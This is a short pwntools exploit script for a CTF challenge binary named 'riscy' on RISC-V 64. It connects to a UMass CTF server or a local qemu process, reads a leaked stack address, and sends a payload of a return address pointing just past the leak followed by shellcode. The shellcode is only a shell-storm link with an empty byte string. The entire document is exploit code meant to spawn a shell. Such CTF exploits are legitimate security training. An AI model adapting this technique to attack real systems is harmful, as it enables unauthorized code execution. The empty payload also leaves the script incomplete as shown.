#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    p = remote('pwn.ctf.umasscybersec.org', 9006)
else:
    if args.D:
        p = process('qemu-riscv64 -g 9000 ./riscy'.split())
    else:
        p = process('qemu-riscv64 riscy'.split())

context.arch = 'riscv64'
context.bits = 64

# http://shell-storm.org/shellcode/files/shellcode-908.php
shellcode = b''

p.recvuntil(b"Hmm, riscy business happning at")
leak = int(p.recvline(), 16)
log.info(leak)
payload  = b''
payload += p64(leak + 0x8)
payload += shellcode

p.sendline(payload)
p.interactive()
